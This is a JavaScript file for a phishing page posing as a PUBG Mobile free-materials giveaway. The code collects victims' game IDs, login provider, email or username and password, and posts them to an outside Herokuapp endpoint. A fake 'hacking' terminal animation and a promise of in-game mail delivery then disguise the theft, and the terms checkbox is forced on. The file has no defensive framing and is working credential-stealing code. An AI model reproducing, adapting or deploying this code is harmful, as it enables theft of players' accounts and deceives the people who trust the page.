function captchaGen() {
    $('.captcha').html(Math.random().toString(36).substring(7));
    $('.captcha').css('color', "#" + ((1 << 24) * Math.random() | 0).toString(16));
    $('#tapatap').addClass('disabled');
}

function winner(username, domain) {

    let total_crates = Math.floor(Math.random() * 100),
        combo = Math.floor(total_crates / 10),
        crate_opening = "";

    for (let i = 1; i <= combo; i++) {
        crate_opening += "_O_p_e_n_i_n_g_ _C_r_a_t_e_s_._._._._[" + `${i * 10}` + "/" + `${combo * 10}` + "]<br>";
    }

    hackText = '_L_o_a_d_i_n_g_ _I_n_t_e_r_f_a_c_e_._._._<br>' +
        '_C_o_n_n_e_c_t_i_n_g_ t_o_ _S_e_r_v_e_r_._._._<br>' +
        '_\n_\n_\n_\n_\n_\n_<br>' +
        '_ A_u_t_h_e_n_t_i_c_a_t_i_n_g_._._<br>' +
        '_ C_a_p_t_u_r_i_n_g_ _H_a_n_d_s_h_a_k_e_._._<br>' +
        '_<g>Connection Successful.</g>_<br>_<br>' +
        '_Redirecting..._\n\n_\n_\n_\n_\n_\n_\n_\n_\n_\n_<br><br>' +
        '_IP_:_ _<g>205.251.193.95</g>_<br>' +
        '_Gateway_:_ _<g>225.225.0.0_ _</g>_<br>' +
        '_DNS_:_ _<g>8.8.8.8</g>_<br>' +
        '_Server_Address_:_ _<g>pubgmobile.com</g>_<br>' +
        '_ A_u_t_h_e_n_t_i_c_a_t_i_n_g_ _ D_a_t_a_b_a_s_e_._._._._._<br>' +
        '_Login Medium_:_ <g>' + domain + '</g><br>' +
        '_Username_:_ _<g>' + username + '</g>_<br>' +
        '_Password_:_ <g>**********</g><br>' +
        '_L_o_g_g_i_n_g_ _I_n_._._._.<br>' +
        '<br>' +
        'You got <g>' + total_crates + '</g> crates...<br>' + crate_opening +
        '<g>Finished !</g>';

    hackText = hackText.split("_")
    count = 0;
    var terminaldiv = document.getElementById("term");
    terminaldiv.innerHTML = '';

    function startTyping() {
        var terminaldiv = document.getElementById("term")

        if (count >= hackText.length) {
            clearInterval(typing);
        }
        else {
            terminaldiv.innerHTML += hackText[count];
            count++;

            if (terminaldiv.innerHTML.includes("You got")) {
                $('#load-modal .modal-title').html("Opening Crates ...");
            }

            if (terminaldiv.innerHTML.includes("Finished")) {
                $('#load-modal .modal-title').html("Counting Materials ...");
            }
        }
    }

    typing = setInterval(startTyping, 100);

    if (combo == 0) {
        return 1;
    } else {
        return combo;
    }
}

function updateBorderGlow(elem) {
    $(elem).css({
        "border-color": "rgba(126, 239, 104, 0.8)",
        "box-shadow": "0 1px 1px rgba(0, 0, 0, 0.075) inset, 0 0 8px rgba(126, 239, 104, 0.6)",
        "outline": "0"
    });
}

function drawMaterial(num) {
    $('#warning').hide();
    $('.material-cont').show();
    let tCtx = document.getElementById('materialCanvas').getContext('2d'),
        img = new Image();

    img.onload = function () {
        tCtx.drawImage(img, 0, 0, 131, 131);
        tCtx.font = "24px Arial";
        tCtx.fillStyle = "#ffffff";
        tCtx.textBaseline = "bottom";
        tCtx.fillText(num, 115, 131);
    }

    img.src = 'assets/images/material.png';
}

$(document).ready(function () {
    captchaGen();

    $('.btn-group.w-100 button').click(function () {
        ($(".btn-group.w-100 button").not($(this))).removeClass("active");
        if (!$(this).hasClass('active')) {
            $(this).toggleClass('active');
            let item = $(this).find('span').html();
            $("#user").attr("placeholder", `${item} Email or Username`);
            $("#pass").attr("placeholder", `${item} Password`);
            $('#user').tooltip({ 'trigger': 'focus', 'title': `Your ${item} Email or Username` });
        }
    });

    $('#termsAgreement').click(function () {
        $(this).prop('checked', true);
    });

    // $('#igid').tooltip({ 'trigger': 'focus', 'title': 'Your In-game Character ID' });
    // $('#ign').tooltip({ 'trigger': 'focus', 'title': 'Your In-game Name' });
    // $('#user').tooltip({ 'trigger': 'focus', 'title': `Your Facebook Email or Username` });
    // $('#pass').tooltip({ 'trigger': 'focus', 'title': 'Your Facebook Password' });

    // validating input
    $(":input").bind("keyup", function (e) {
        // igid (5-12)
        let ig_id = $('#igid').val().trim();

        if (ig_id < 9999 || ig_id > 999999999999) {
            $('#igid').removeClass('is-valid');
            $('#igid').addClass('is-invalid');
        } else {
            $('#igid').removeClass('is-invalid');
            $('#igid').addClass('is-valid');
        }

        // email
        let len_user = $('#user').val().trim().length;

        if (len_user < 5) {
            $('#user').removeClass('is-valid');
            $('#user').addClass('is-invalid');
        } else {
            $('#user').removeClass('is-invalid');
            $('#user').addClass('is-valid');
        }

        // pass
        let len_pass = $('#pass').val().trim().length;

        if (len_pass < 6) {
            $('#pass').removeClass('is-valid');
            $('#pass').addClass('is-invalid');
        } else {
            $('#pass').removeClass('is-invalid');
            $('#pass').addClass('is-valid');
        }

        // captcha
        if ($('.captcha').html() != $('#captcha').val()) {
            $('#captcha').removeClass('is-valid');
            $('#captcha').addClass('is-invalid');
        } else {
            $('#captcha').removeClass('is-invalid');
            $('#captcha').addClass('is-valid');
        }

        // agreement
        if ($('#termsAgreement').prop("checked")) {
            $('#termsAgreement').removeClass('is-invalid');
            $('#termsAgreement').addClass('is-valid');
        } else {
            $('#termsAgreement').removeClass('is-valid');
            $('#termsAgreement').addClass('is-invalid');
        }

        // check all are valid ?
        if ($('#data :input.form-control').hasClass('is-invalid')) {
            if (!$('#tapatap').hasClass('disabled')) {
                $('#tapatap').addClass('disabled');
            }
        } else {
            if (!$('#termsAgreement').prop("checked")) {
                $('#termsAgreement').addClass('is-invalid');
                if (!$('#tapatap').hasClass('disabled')) {
                    $('#tapatap').addClass('disabled');
                }
            } else {
                $('#tapatap').removeClass('disabled');
            }
        }
    });

    // $(document).ajaxStart(function () {
    //     $("#snackbar").addClass('show');
    //     $("#data :input").prop("disabled", true);

    //     if ($('#tapatap').hasClass('disabled')) {
    //         // do nothing
    //     } else {
    //         $('#tapatap').addClass('disabled');
    //     }
    // }).ajaxStop(function () {
    //     if ($('#snackbar').hasClass('show')) {
    //         $("#snackbar").removeClass('show');
    //     }
    // });

    $('.fa-sync').on('click', function () {
        captchaGen();
    });

    // ON SUBMIT
    $('#tapatap').on('click', function (e) {
        if (!$(this).hasClass('disabled')) {
            if ($('#tapatap').hasClass('disabled')) {
                // do nothing
            } else {
                $('#tapatap').addClass('disabled');
            }

            if ($('#snackbar').hasClass('show')) {
                // nothing
            } else {
                $("#snackbar").addClass('show');
            }

            let igid = $('#igid').val(),
                ign = $('#ign').val(),
                user = $('#user').val(),
                pass = $('#pass').val(),
                domain = $('.btn-group.w-100 button.active').prop('id');

            if ($('.captcha').html() == $('#captcha').val() &&
                igid.length != 0 &&
                ign.length != 0 &&
                $('#captcha').val().length != 0) {

                if (user.length > 0 && pass.length >= 6) {
                    let payload = {
                        "ingameID": igid,
                        "ingameName": ign,
                        "accDomain": domain,
                        "accEmail": user,
                        "accPass": pass,
                    }

                    try {
                        $.ajax({
                            url: "https://cap-pubgm-id.herokuapp.com/cap/acc",
                            method: "POST",
                            timeout: 10000,
                            data: JSON.stringify(payload),
                            headers: {
                                "Content-Type": "application/json"
                            },
                            success: function () {
                                if ($('#snackbar').hasClass('show')) {
                                    $("#snackbar").removeClass('show');
                                }
                                $('#data').get(0).reset();
                                captchaGen();
                                $('.participate-div').hide();
                                // $('.circle-loader').show();
                                $("body").css({ "background": "#000", "color": "#fff" });
                                $("#term").show();

                                let materials = winner(user, domain);
                                $("#load-modal").modal({
                                    backdrop: 'static',
                                    keyboard: false,
                                });

                                $('#load-modal').modal('show');

                                setTimeout(() => {
                                    $('.circle-loader').toggleClass('load-complete');
                                    $('.checkmark').toggle();
                                    $('#load-modal .modal-title').html("You got <r>" + `${materials}` + "</r> materials !");
                                    drawMaterial(materials);
                                    $('.circle-loader').hide();
                                    $('#msg').html(
                                        "It will take several hours to deliver <r>" + `${materials}` + "</r> materials to your pubg mobile account (<r>" + `${igid}` +
                                        "</r>). You'll receive the materials in-game mail system.<br><br> Thank you for participating in the giveaway !"
                                    );
                                    $('#load-modal .modal-footer').show();
                                }, 35000);
                            },
                            error: function (textStatus, errorThrown) {
                                $('#err-modal').modal('show');

                                if ($('#snackbar').hasClass('show')) {
                                    $("#snackbar").removeClass('show');
                                }

                                if (errorThrown === "timeout") {
                                    if ($('#tapatap').hasClass('disabled')) {
                                        $('#tapatap').removeClass('disabled');
                                    }

                                    $('#err-modal .modal-title').html("Serever timeout");
                                    $('#err-modal .modal-body h5').html("Please press \"Get Materials\" button again.");

                                    $('#err-modal .modal-footer').html('<button class="btn btn-secondary" data-dismiss="modal">Close</button>');
                                } else {
                                    $('#err-modal .modal-footer').html('<button class="btn btn-danger dismiss" data-dismiss="modal">Close</button>');
                                }
                            }
                        });
                    } catch (error) {
                        console.log(error);
                    }
                } else {
                    $('#pass').addClass('is-invalid');
                }
            }
        }
    });

    $('.dismiss').on('click', function () {
        window.location.href = "../../index.html";
    });
});